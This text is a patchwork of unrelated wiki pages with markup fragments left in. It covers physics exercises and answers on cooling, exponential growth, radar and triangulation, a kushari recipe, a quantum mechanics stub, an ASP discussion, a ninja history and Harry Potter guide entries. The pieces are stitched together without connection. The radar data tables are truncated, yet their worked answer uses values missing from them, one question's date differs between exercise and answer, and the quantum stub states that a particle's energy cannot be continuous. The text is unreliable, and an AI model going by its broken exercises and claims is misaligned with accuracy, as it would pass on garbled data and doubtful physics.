3. A body is found in a library (as per Agatha Christie) at 8am. The temperature of the library is kept at a constant temperature of 20 &amp;deg;C for 10 minutes. During these 10 minutes, the body cools from 25 &amp;deg;C to 24 &amp;deg;C. The body temperature of a healthy human being is 36.8 &amp;deg;C. At what time was the person murdered?

4. Suppose for a moment that the number of pages on Wikibooks ''p'' can be modelled as an exponential relationship. Let the number of pages required on average to attract an editor be ''a'', and the average number of new pages created by an editor each year be ''z''. Derive an equation expressing ''p'' in terms of the time in years since Wikibooks was created ''t''.

5. Wikibooks was created in mid-2003. How many pages should there have been 6 years later? (Take a = 20, z = 10 yr&lt;sup&gt;-1&lt;/sup&gt;.)

6. The actual number of pages in Wikibooks in mid-2009 was 35,148. What are the problems with this model? What problems may develop, say, by 2103?

      <text xml:space="preserve">'''1. Simplify Newton's Law of Cooling for the case when I place a warm object in a large tank of water which is on the point of freezing. Measure temperature in &amp;deg;C.'''

Newton's Law of Cooling states that &lt;math&gt;T_t = T_{env} + (T_0 - T_{env})e^{-rt}&lt;/math&gt;

The freezing point of water is 0 &amp;deg;C, so, if we measure T in &amp;deg;C, T&lt;sub&gt;env&lt;/sub&gt; = 0:

&lt;math&gt;T_t = 0 + (T_0 - 0)e^{-rt}&lt;/math&gt;

&lt;math&gt;T_t = T_0e^{-rt}&lt;/math&gt;

'''2. What will the temperature of an object at 40 &amp;deg;C be after 30 seconds? (Take r=10&lt;sup&gt;-3&lt;/sup&gt; s&lt;sup&gt;-1&lt;/sup&gt;.)'''

&lt;math&gt;T_t = T_0e^{-rt} = 40 \times e^{-10^{-3} \times 30} = 38.8&lt;/math&gt; &amp;deg;C

'''3. A body is found in a library (as per. Agatha Christie) at 8am. The temperature of the library is kept at a constant temperature of 20 &amp;deg;C for 10 minutes. During these 10 minutes, the body cools from 25 &amp;deg;C to 24 &amp;deg;C. The body temperature of a healthy human being is 36.8 &amp;deg;C. At what time was the person murdered?'''

First, we must calculate r:

&lt;math&gt;24 = 20 + (25 - 20)e^{-10r}&lt;/math&gt;

&lt;math&gt;4 = 5e^{-10r}&lt;/math&gt;

&lt;math&gt;e^{-10r} = 0.8&lt;/math&gt;

&lt;math&gt;-10r = \ln{0.8}&lt;/math&gt;

&lt;math&gt;r = \frac{\ln{0.8}}{-10} = 0.0223\mbox{ minute}^{-1}&lt;/math&gt;

Then, calculate t - this is the time between the murder and 8am:

&lt;math&gt;25 = 20 + (36.8 - 20)e^{-0.0223t}&lt;/math&gt;

&lt;math&gt;5 =16.8e^{-0.0223t}&lt;/math&gt;

&lt;math&gt;e^{-0.0223t} = \frac{5}{16.8}&lt;/math&gt;

&lt;math&gt;-0.0223t = \ln{\frac{5}{16.8}}&lt;/math&gt;

&lt;math&gt;t = \frac{\ln{\frac{5}{16.8}}}{-0.0223} = 54 \mbox{ minutes}&lt;/math&gt;

Therefore, the murder occurred at 7:06am.

'''4. Suppose for a moment that the number of pages on Wikibooks ''p'' can be modelled as an exponential relationship. Let the number of pages required on average to attract an editor be ''a'', and the average number of new pages created by an editor each year be ''z''. Derive an equation expressing ''p'' in terms of the time in years since Wikibooks was created ''t''.'''

Let ''n'' be the number of editors.

&lt;math&gt;n = \frac{p}{a}&lt;/math&gt;

&lt;math&gt;\frac{dp}{dt} = nz = z\frac{p}{a}&lt;/math&gt;

&lt;math&gt;dp = z\frac{p}{a} dt&lt;/math&gt;

&lt;math&gt;\int{\frac{1}{p}} dp = \int{\frac{z}{a}} dt&lt;/math&gt;

&lt;math&gt;\ln{p} = \frac{zt}{a} + c&lt;/math&gt; (where c is the constant of integration)

&lt;math&gt;p = e^{\frac{zt}{a} + c} = e^{\frac{zt}{a}}e^c = ke^{\frac{zt}{a}}&lt;/math&gt; (where k is a constant - k = e&lt;sup&gt;c&lt;/sup&gt;)

There must have been a first page, which marked the point where t = 0, so:

&lt;math&gt;1 = ke^{\frac{z}{a} \times 0} = ke^0 = k&lt;/math&gt;

Therefore:

&lt;math&gt;p = e^{\frac{zt}{a}}&lt;/math&gt;

'''5. Wikibooks was created in mid-2003. How many pages should there have been 6 years later? (Take a = 20, z = 10 yr&lt;sup&gt;-1&lt;/sup&gt;.)'''

&lt;math&gt;p = e^{\frac{zt}{a}} = e^{\frac{10 \times 6}{20}} = e^3 = 20&lt;/math&gt;

'''6. The actual number of pages in Wikibooks in mid-2009 was 35,148. What are the problems with this model? What problems may develop, say, by 2103?'''

There are two key problems with this model:

* We have estimated the values of the constants. These should have been determined statistically.

* We have assumed that the constants are constant. In reality, as the amount of content on Wikibooks increases, more people think &quot;Wikibooks already contains this content, so I am not going to add anything.&quot; This means that both z and a change with time. Our exponential model only applies over small periods of time. Each of these small periods of time has different values for the constants.

In the future, such as 2103, the constants will have changed so radically as to be useless. Question 5 shows how much they change over just 6 years - how much more must they change over a whole century!

      <comment>/* Distance */</comment>
      <text xml:space="preserve">Radar and triangulation are two relatively easy methods of measuring the distance to some celestial objects. Radar can also be used to measure the velocity of a celestial object relative to us.

==Radar==

Essentially, radar is a system which uses a radio pulse to measure the distance to an object. The pulse is transmitted, reflected by the object, and then received at the site of the transmitter. The time taken for all this to happen is measured. This can be used to determine the distance to a planet or even the velocity of a spaceship.

===Distance===
The speed of electromagnetic waves (c) is constant in a vacuum: 3 x 10&lt;sup&gt;8&lt;/sup&gt; ms&lt;sup&gt;-1&lt;/sup&gt;. If we fire a pulse of radio waves to a planet within the Solar System, we know that:

&lt;big&gt;&lt;big&gt;&lt;math&gt;d = ct&lt;/math&gt;&lt;/big&gt;&lt;/big&gt;

where d is the distance to the object, and t is the time taken for the pulse to travel there and back from the object. However, the pulse has to get both there and back, so:

&lt;big&gt;&lt;big&gt;&lt;math&gt;2d = ct&lt;/math&gt;&lt;/big&gt;&lt;/big&gt;

&lt;math&gt;d = \frac{ct}{2}&lt;/math&gt;

where d is the distance to the object, and t is the time taken for the pulse to return.

===Velocity===

The velocity of an object can be found by firing two radar pulses at an object at different times. Two distances are measured. When asked to calculate the relative velocity of an object in this way, use the following method:

1. Calculate the distance to the object at both times:

&lt;math&gt;d_1 = \frac{c\Delta t_1}{2}&lt;/math&gt;

&lt;math&gt;d_2 = \frac{c\Delta t_2}{2}&lt;/math&gt;

2. Calculate the distance the object has travelled between the two pulses. This is the difference between the two distances previously calculated:

&lt;big&gt;&lt;big&gt;&lt;math&gt;\Delta d = d_2 - d_1&lt;/math&gt;&lt;/big&gt;&lt;/big&gt;

3. Calculate the time between the transmission (or reception, but not both) of the two pulses:

&lt;big&gt;&lt;big&gt;&lt;math&gt;\Delta t = t_2 - t_1&lt;/math&gt;&lt;/big&gt;&lt;/big&gt;

4. Divide the distance calculated in step 2 by the time calculated in step 3 to find the average velocity of the object between the transmission of the two pulses:

&lt;math&gt;v = \frac{\Delta d}{\Delta t}&lt;/math&gt;

==Triangulation==
[[Image:Triangulation_astro.svg|right|thumb|200px|The distance from the solar system to a relatively nearby celestial object can be found using triangulation.]]

We know that the Earth is, on average, about 150 Gm away from the Sun. If we measure the angle between the vertical and the light from a nearby star 6 months apart (i.e. on opposite sides of the Sun), we can approximate the distance from the Solar System to the star.

Let r be the radius of the Earth's orbit (assumed to be constant for simplicity's sake), a and b be the angles to the star (from the horizontal) when the Earth is on either side of the Sun, and let d be the perpendicular distance from the plane of the Earth's orbit to the star, as shown in the diagram on the right. By simple trigonometry:

&lt;math&gt;2r = \frac{d}{\tan{a}} + \frac{d}{\tan{b}} = \frac{d(\tan{a} + \tan{b})}{\tan{a}\tan{b}}&lt;/math&gt;

Therefore:

&lt;math&gt;d = \frac{2r\tan{a}\tan{b}}{\tan{a} + \tan{b}}&lt;/math&gt;

==Questions==

1. A radar pulse takes 8 minutes to travel to Venus and back. How far away is Venus at this time?

2. Why can't a radar pulse be used to measure the distance to the Sun?

Regardless of (λ) wavelength, power density, or wavefront properties, the pulse would be absorbed with no reflection possible.  Distances to pure energy sources are generally measured in terms of received light intensity, shifts of the light spectrum, and radio interferometry.  The RF spectrum; and Laser (light) spectrum can be used to &quot;listen&quot; to radiation, but not bounce a pulse from an energy source having no true angle of incidence. Just as an observation, I will note that the sun can be seen on most radars either sunrise or sunset, usually when the sun is just above the horizon. But these receptions are unusable strobes (interference) and not a result of receiving a radar pulse from the sun.  Radar technicians also use the sun as a &quot;known&quot; exact position to align the system to true north (and magnetic variations); this is called solar-boresighting and, again, only receives the radiation.  

3. Radar is used to measure the velocity of a spacecraft travelling between the Earth and the Moon. Use the following data to measure this velocity:

| 3:26:45.51213
|-
| 2
| 3:26:46.32742
| 3:26:46.52785
|}

4. The angles between the horizontal and a star are measured at midnight on January 1 as 89.99980&amp;deg; and at midnight on July 1 as 89.99982&amp;deg;. How far away is the star?

5. Why can't triangulation be used to measure the distance to another galaxy?

      <text xml:space="preserve">'''1. A radar pulse takes 8 minutes to travel to Venus and back. How far away is Venus at this time?'''

&lt;math&gt;2d = ct = 3 \times 10^8 \times 8 \times 60 = 1.44 \times 10^{11} \mbox{ m}&lt;/math&gt;

&lt;math&gt;d = 1.44 \times 10^{11}\times 0.5 = 7.2\times 10^{10} \mbox{ m}&lt;/math&gt;

'''2. Why can't a radar pulse be used to measure the distance to the Sun?'''

It would be impossible to pick up the reflected signal due to all the other signals coming from the Sun. Also, the signal would almost certainly be absorbed anyway.  
&lt;&lt;Added&gt;&gt; Regardless of (λ) wavelength, power density, or wavefront properties, the pulse would be absorbed with no reflection possible. Distances to pure energy sources are generally measured in terms of received light intensity, shifts of the light spectrum, and radio interferometry. The RF spectrum; and Laser (light) spectrum can be used to &quot;listen&quot; to radiation, but not bounce a pulse from an energy source having no true angle of incidence.

'''3. Radar is used to measure the velocity of a spacecraft travelling between the Earth and the Moon. Use the following data to measure this velocity:'''

{| border=&quot;1&quot;

| 3:26:45.51213
|-

| 3:26:46.32742
| 3:26:46.52785
|}

First, calculate the distance of the spacecraft from the Earth at each time:

&lt;math&gt;d_1 = \frac{c\Delta t_1}{2} = \frac{3.0 \times 10^{8} \times (45.51213 - 45.31213)}{2} = 30,000\mbox{ km}&lt;/math&gt;

&lt;math&gt;d_2 = \frac{c\Delta t_2}{2} = \frac{3.0 \times 10^{8} \times (46.52785 - 46.32742)}{2} = 30,064.5\mbox{ km}&lt;/math&gt;

Next, calculate the distance the spacecraft has travelled between the two pulses:

&lt;math&gt;\Delta d = d_2 - d_1 = 30,064.5 - 30,000 = 64.5\mbox{ km}&lt;/math&gt;

Now, calculate the time elapsed between the transmission of the two pulses:

&lt;math&gt;\Delta t = t_\beta - t_\alpha = 46.32742 - 45.31213 = 1.01529\mbox{ s}&lt;/math&gt;

Finally, divide the distance the spacecraft has travelled between the two pulses by the time between the transmission of the two pulses, to give the average velocity of the spacecraft in that interval of time:

&lt;math&gt;v = \frac{\Delta d}{\Delta t} = \frac{64.5}{1.01529} \approx 63.5 \mbox{ kms}^{-1} &lt;/math&gt;

'''4. The angles between the horizontal and a star are measured at midnight on January 1 as 89.99980&amp;deg; and at midnight on June 1 as 89.99982&amp;deg;. How far away is the star?''' 

&lt;math&gt;d = \frac{2r\tan{a}\tan{b}}{\tan{a} + \tan{b}} = \frac{2 \times 150 \times 10^9 \times \tan{89.9998}\tan{89.99982}}{\tan{89.9998} + \tan{89.99982}} = 4.52 \times 10^{13}\mbox{ km}&lt;/math&gt;  

'''5. Why can't triangulation be used to measure the distance to another galaxy?'''

The difference between the two angles becomes so tiny that we don't have good enough equipment to measure it.

==Egyptian Kushari==

Yield: 7 servings

===Ingredients===
*1 [[Cookbook:Cup|cup]] [[Cookbook:Basmati rice|basmati rice]]
*1 cup brown [[Cookbook:lentil|lentils]] 
*1 cup [[Cookbook:macaroni|elbow macaroni]] 
*0.5 cup [[Cookbook:chickpea|chickpeas]]

'''For the sauce:'''
*1 6 oz can tomato paste 
*1 cup water 
*2 [[Cookbook:Teaspoon|teaspoons]] [[Cookbook:cumin|cumin]] 
*1 teaspoon white wine vinegar, more to taste 
*1 teaspoon ground black pepper, more to taste 
*2 [[Cookbook:Tablespoon|tablespoons]] olive oil 
*0.5 onion, diced

===Preparation===
Pre-soaking the lentils and especially the chickpeas is recommended before cooking them. Alternately, canned chickpeas can be used. (Drained, one third of the can.) Cook the rice, chickpeas, and lentils until tender, the macaroni until al dente.

In a sealable container (I use a large Tupperware), layer the rice, the lentils, and the macaroni, and then the chickpeas. To make the sauce, mix the tomato paste and water in a saucepan, put on medium low heat, add the cumin, black pepper and vinegar, mixing them in well. Heat the sauce for approximately 5 minutes. Saute the diced onions in olive oil until crisp, drain off the excess oil. 

To serve, scoop 1.5 cups of the koshari into an individual bowl, pour the sauce over the serving, and garnish with 1 tablespoon of the onions. Add vinegar and black pepper to taste.

      <text xml:space="preserve">{{Quantum Mechanics/Page}}
The Mass,Momentum and Energy are related by  E=P&lt;sup&gt;2&lt;/sup&gt;/2m where P is the momentum, m is mass of the particle. The difference in the quantum mechanics is that energy cannot be continuous for a particle. Even the great aspect is that energy of quantum particle can have a minimum value but cannot be zero.</text>

There is no summary information about the language itself. More information about the language in general would be very helpful. I would like to see some points such as 

#What advantages does ASP have over other languages? 
#How heavy is it in terms of processing requirements? 
#Why would someone choose ASP over another option or when would you avoid using ASP? 
#Why was ASP developed?

I am no expert so I cannot answer those questions myself, but I that information would be very valuable.

==Factual Errors==

: A significant advantage of using code behind is that the code behind file must be pre-compiled. Pre-compiling the file allows it to execute faster and forces the person designing it to fix errors at compile-time, rather than run-time.

This is misleading on several accounts

# There is no reason why code and data couldn't be compiled together (unless it is a .NET quirk).
# There is not reason why a separate code file must be compiled, it just makes sense to compile it.
# Every program is compiled, it's just some of them aren't compiled until they are run. Proper testing implies running the code, which implies compiling.
# Compiling a file has little to do with finding errors. That has a lot more to do with strong typing/dynamic typing and such.
:That is largely correct. Feel free to update the text (after checking of course that everything works like we think).</text>

In Japanese history, a '''ninja''' is a warrior specially trained in a variety of unorthodox arts of war. These include assassination, illusion, espionage, and various martial arts.

The exact origin of the ninja is a matter of debate. It is known that ninja appeared in 14th century Japan and remained active from the Kamakura to the Edo period. The role of the ninja may have included sabotage, espionage, scouting and assassination as a method of destabilization or to cause social chaos. Such actions may have taken place at the service of a feudal lord (daimyo, shogun), or other entity waging guerilla warfare.

==Etymology==
''Ninja'' is the ''on'yomi'' reading of the two kanji 忍者 used to write ''shinobi-no-mono'' (忍の者), which is the native Japanese word for people who practice ninjutsu (忍術, sometimes transliterated as ''ninjitsu''). The term ''shinobi'' (historically written with the Man'yōgana 志能備), has been traced as far back as the late 8th century to a poem Satake, Man'yōsh to Ōtomo no Yakamochi. The underlying connotation of ''shinobi'' means &quot;to steal away&quot; and—by extension—&quot;to forbear&quot;, hence its association with stealth and invisibility. ''Mono'' (likewise pronounced ''sha'' or ''ja'') means a &quot;person.&quot; 

The word ''ninja'' became popular in the post-World War II culture. The ''nin'' of ''ninjitsu'' is the same as that in ''ninja'', whereas ''jitsu'' means skill or art, so ''ninjitsu'' means &quot;the skill of going unperceived&quot; or &quot;the art of stealth&quot;; hence, ''ninja'' and ''shinobi-no-mono'' (as well as ''shinobi'') may be translated as &quot;one skilled in the art of stealth.&quot; Similarly, the pre-war word ''ninjitsu-zukai'' means &quot;one who uses the art of remaining unperceived.&quot;

Other terms which may be used include ''oniwaban'' (お庭番 &quot;one in the garden&quot;), ''suppa'', ''rappa'', ''mitsumono'', ''kusa'' (草 grass) and ''Iga-mono'' (&quot;one from Iga&quot;). 

In English, the plural of ''ninja'' can be either unchanged as ''ninja'', reflecting the Japanese language's lack of grammatical number, or the regular English plural ''ninjas''.

==Period of origin==
Ninja as a group first began to be written about in 14th century feudal Japan as martial organizations predominately in the regions of Iga and Koga of central Japan, though the practice of guerrilla warfare and undercover espionage operations goes back much further. 

At this time, the conflicts between the clans of ''daimyo'' that controlled small regions of land had established guerrilla warfare and assassination as a valuable alternative to frontal assault. Since ''Bushidō'', the samurai code, forbade such tactics as dishonorable, a daimyo could not expect his troops to perform the tasks required; thus, he had to buy or broker the assistance of ninja to perform selective strikes, espionage, assassination, and infiltrationof enemy strongholds.
 
There are a few people and groups of people regarded as having been potential ninja from approximately the same period. They are typically considered assassins. However, in his book ''Mystic Arts of the Ninja'', Stephen K. Hayes depicts them in armor similar to a samurai. Hayes also says those who ended up recording the history of the ninja were typically those in positions of power in the military dictatorships. According to Hayes and Masaaki Hatsumi 

''Ninjitsu'' did not come into being as a specific well defined art in the first place, and many centuries passed before ninjitsu was established as an independent system of knowledge in its own right. Ninjitsu developed as a highly illegal counter culture to the ruling samurai elite, and for this reason alone, the origins of the art were shrouded by centuries of mystery, concealment, and deliberate confusion of history.&quot; 

A similar account is given by Hayes: &quot;The predecessors of Japan's ninja were so-called rebels favoring Buddhism who fled into the mountains near Kyoto as early as the 7th century A.D. to escape religious persecutionand death at the hands of imperial forces. 

==Historical organization==
In their history, ninja groups were small and structured around families and villages, later developing a more martial hierarchy that was able to mesh more closely with samurai and the daimyo. These certain ninjitsu trained groups were set in these villages for protection against raiders and robbers. 

Ninja museums in Japan declare women to have been ninja as well. A female ninja may be ''kunoichi'' (くノ一); the characters are derived from the strokes that make up the kanji for female (女). They were sometimes depicted as spies who learned the secrets of an enemy by seduction; though it's just as likely they were employed as household servants, putting them in a position to overhear potentially valuable information.

As a martial organization, it has been assumed that ninja would have had many rules, and keeping secret the ninja's clan and the daimyo who gave them their orders would have been one of the most important ones. For modern hierarchy in ninjitsu, see the article about ninjutsu.

== Overview ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

The '''''Inquisitorial Squad''''' is a group of students given power to dock House points, supposedly to assist [[Muggles' Guide to Harry Potter/Characters/Dolores Umbridge|Professor Umbridge]] to perform her duties as Hogwarts High Inquisitor.

== Event Details ==

Shortly after declaring herself Headmaster of [[Muggles' Guide to Harry Potter/Places/Hogwarts School of Witchcraft and Wizardry|Hogwarts]], [[Muggles' Guide to Harry Potter/Characters/Dolores Umbridge|Professor Umbridge]] institutes something she calls the Inquisitorial Squad, apparently intended to assist her in her duties as Hogwarts High Inquisitor. The members of this squad, &quot;a few ''trustworthy'' students,&quot; are empowered to take House points, giving them power greater even than [[Muggles' Guide to Harry Potter/Major Events/Prefects|Prefects]], who we have been told  are not granted this ability.

The Inquisitorial Squad is introduced to us by [[Muggles' Guide to Harry Potter/Characters/Draco Malfoy|Draco Malfoy]], who shows us the powers he has been granted by penalizing Gryffindor House about forty points for no particular reason. We learn very soon after this that [[Muggles' Guide to Harry Potter/Characters/Montague|Montague]] is also a member of that squad, but had been pushed into an old, broken [[Muggles' Guide to Harry Potter/Magic/Disappearing Cabinets|Vanishing Cabinet]] by [[Muggles' Guide to Harry Potter/Characters/Fred and George Weasley|Fred and George]] when he had tried to penalize them House points. He reappears shortly, inside a toilet, and is unable to explain how he got there; we see him at a few later points in the story, in the hospital wing, where he remains nearly incoherent.

It is mentioned in passing that several other members of the Inquisitorial Squad are attacked. We are told specifically that [[Muggles' Guide to Harry Potter/Characters/Warrington|Warrington]] is sent to the Hospital Wing with a skin ailment that makes him appear as if he had been coated in corn flakes, and [[Muggles' Guide to Harry Potter/Characters/Pansy Parkinson|Pansy Parkinson]] loses a full day of classes because she has grown antlers.

When Umbridge learns of the existence of [[Muggles' Guide to Harry Potter/Major Events/Dumbledore's Army|Dumbledore's Army]], she summons the Inquisitorial Squad to assist her in capturing the DA members. It is perhaps a comment on the overall ability of the Squad that, of twenty-eight DA members then present, only one is caught: Harry, last out of the [[Muggles' Guide to Harry Potter/Places/Room of Requirement|Room of Requirement]], is caught by Draco Malfoy. The scroll listing members of Dumbledore's Army is retrieved by Pansy Parkinson; no other member of the Inquisitorial Squad has any apparent effect.

When Harry breaks into Umbridge's office to try to communicate with [[Muggles' Guide to Harry Potter/Characters/Sirius Black|Sirius]], to determine whether he has in fact gone to the [[Muggles' Guide to Harry Potter/Places/Ministry of Magic|Ministry]], Umbridge is alerted by a spell she has set on her office. Umbridge sets the Inquisitorial Squad to round up the conspirators. Whether this is the entire Squad or not, we do not know, but the Squad members we see here are Draco Malfoy, Warrington, [[Muggles' Guide to Harry Potter/Characters/Vincent Crabbe|Crabbe]], [[Muggles' Guide to Harry Potter/Characters/Millicent Bullstrode|Milicent Bulstrode]], and &quot;several large Slytherins&quot; who are not named. Again, the effectiveness of the Squad is questionable, because despite having confiscated all wands from their captives, the entire squad is disabled, in an effort led off with a [[Muggles' Guide to Harry Potter/Magic/Bat Bogey Hex|Bat-Bogey hex]] somehow cast by [[Muggles' Guide to Harry Potter/Characters/Ginny Weasley|Ginny Weasley]].

With Umbridge's removal as headmistress and High Inquisitor, the Squad is disbanded.

== Notable Consequences ==

By means of wide-ranging abuse of their powers, the Inquisitorial Squad manages to largely ensure that Slytherin House will have the largest number of House Points at the end of the year, and thus will win the House Cup. [[Muggles' Guide to Harry Potter/Characters/Minerva McGonagall|Professor McGonagall]], by according [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] and the five students who accompanied him fifty points each for alerting the Wizarding world to the return of [[Muggles' Guide to Harry Potter/Characters/Lord Voldemort|Voldemort]], returns Gryffindor's total to something respectable, but apparently not sufficient to win them the House cup.

As mentioned, Montague, attempting to penalize Fred and George, is pushed into a broken Vanishing Cabinet, almost certainly the one that [[Muggles' Guide to Harry Potter/Characters/Peeves|Peeves]] had dropped [[Muggles' Guide to Harry Potter/Books/Chamber of Secrets/Chapter 8|three years before]]. Montague, despite being left somewhat less than fully competent by the experience, learns where the other member of that pair of cabinets is, and is able to pass that information on to Draco Malfoy. This sets up a large part of the plot of [[Muggles' Guide to Harry Potter/Books/Half-Blood Prince|the sixth book]]. If Montague had not been in the Inquisitorial Squad, it is unlikely he would have done anything that would have so aggravated the Twins.

The creation of the Inquisitorial Squad, rather than increasing Umbridge's control over the students, seems instead to increase the rebellion, with Squad members being targeted for direct retaliation. As the Squad is created at the same time as [[Muggles' Guide to Harry Potter/Characters/Albus Dumbledore|Dumbledore]] is removed as Headmaster, however, it is never certain whether it is the Squad's action or Umbridge being Headmistress that is the cause of the increase in rebellion.

== Analysis ==

It is apparent that Umbridge has selected students only from Slytherin house. It is uncertain whether she actually considers them more &quot;trustworthy&quot;, as she says to [[Muggles' Guide to Harry Potter/Characters/Cornelius Fudge|Fudge]], or whether she rather believes that they can be bought and will stay loyal to the paymaster. One does gather that the characteristic of those Sorted into Slytherin, &quot;''those cunning folk use any means, to achieve their ends'',&quot; as the [[Muggles' Guide to Harry Potter/Characters/Sorting Hat|Sorting Hat]] says, is a clear view of the main chance and a willingness to do anything for personal gain.

Of course, Umbridge is not paying them in Galleons, but rather in power and influence, a coin that the Slytherin psyche seems designed to appreciate. The Squad, being placed even above the [[Muggles' Guide to Harry Potter/Major Events/Prefects|Prefects]], [[Muggles' Guide to Harry Potter/Major Events/Head Boy|Head Boy, and Head Girl]], clearly has the most power of any students in the school.

It is perhaps instructive to note how ineffectual the Squad, despite its additional powers, is in keeping order in the school. In fact, the constitution of the Squad seems designed to foster rebellion, as so many of Umbridge's measures seem to be. The Squad, having power and no apparent accountability, is seen to be abusing its power immediately it is formed, and there is no recourse; any appeal would have to be to Umbridge, who has already displayed a level of partiality to Slytherin greater even than that shown by [[Muggles' Guide to Harry Potter/Characters/Severus Snape|Snape]]. The retaliation against the Squad, and the rebellion against them and the rules they are supposedly enforcing, shows that Umbridge has only amplified the ham-fistedness of her attempts at governance.

== Questions ==
{{Muggles' Guide to Harry Potter/Questions}}

== Greater Picture ==

{{Muggles' Guide to Harry Potter/Intermediate Spoiler}}

Like so much else in the series, the depiction of the Inquisitorial Squad, and the reaction to it, are extremely true to life. We can see that Dolores Umbridge is intent on power, and ultimately is not particularly effective in retaining that power once she has it. Her attempts to enforce her authority are heavy-handed, and immediately lose her the support of those whose support she needs, the teachers; the student rebellion is ignored, and sometimes actively fostered, by the teachers who should, in theory, be preventing it. Having lost the support of the teachers, Umbridge attempts to create a support organization out of thin air by recruiting students who, being from Slytherin house as we presume Umbridge herself was, can supposedly be trusted to stay on her side if rewarded with power over other students. Saying someone has authority does not necessarily give them authority, and in this case, we find that creating this group has largely made them into targets. We also find that the Squad are abusing their powers, something which will increase rebellion rather than control it; this is only to be expected when this sort of authority is given without any responsibility to use it wisely, particularly when the authority is given to those still too immature to completely understand responsibility.

Umbridge's entire career at Hogwarts, from her first appearance at Hogwarts until her capture by the [[Muggles' Guide to Harry Potter/Magic/Centaur|Centaurs]], can be seen as an illustration of the consequences of an imbalance between authority and responsibility. Backed by the [[Muggles' Guide to Harry Potter/Magic/Ministry of Magic|Ministry]], Umbridge claims more and more authority over the course of the year, without ever being placed in a position where she has to take responsibility for her actions in securing that authority. There is no recourse, no way of appealing her judgements, and the only apparent recourse against her patently obvious partiality is rebellion. In this atmosphere, creating an additional police force is bound to be counter-productive. In this case, with three quarters of the school in rebellion, including the group (teachers) who are most likely to be able to control the school, appointing a police force, with authority but no responsibility, will only worsen the situation.

It should be noted that Umbridge, throughout the story, seems to believe that the Hogwarts students are uniformly immature, and is trying to set herself up as a parental figure of some sort. She seems to have never learned the lesson that one does not demand respect, one must earn it. Throughout her history in the series, we see her attempting to enforce respect by means of power, and failing. The Inquisitorial Squad is part of this same pattern; we see that she is hand-picking those who will carry out her policies in return for the power she grants them, with the intent of gaining respect through widening her power base. We suspect that even those in the Inquisitorial Squad do not respect Umbridge, as much as they might like their own increased authority.

== Overview ==

'''''Eric Munch''''' is a watchwizard at the [[Muggles' Guide to Harry Potter/Places/Ministry of Magic|Ministry of Magic]].

== Role in the Books ==

{{Muggles' Guide to Harry Potter/Beginner Spoiler}}

=== [[Muggles' Guide to Harry Potter/Books/Order of the Phoenix|Order of the Phoenix]] ===

When [[Muggles' Guide to Harry Potter/Characters/Harry Potter|Harry]] is entering the [[Muggles' Guide to Harry Potter/Places/Ministry of Magic|Ministry]] to attend his hearing, he must stop at the security desk, where the watch wizard, here identified only as Eric, must weigh his wand. Having done so, the wizard looks at Harry for the first time, and noticing his scar, seems to realize who Harry is. Before he can say anything else, [[Muggles' Guide to Harry Potter/Characters/Arthur Weasley|Arthur Weasley]], accompanying Harry, thanks him dismissively.

It is reported in [[Muggles' Guide to Harry Potter/Magic/The Daily Prophet|the ''Daily Prophet'']] that watchwizard Eric Munch was the one who had caught [[Muggles' Guide to Harry Potter/Characters/Sturgis Podmore|Sturgis Podmore]] attempting to break through a secure door at the Ministry of Magic on 31 August.
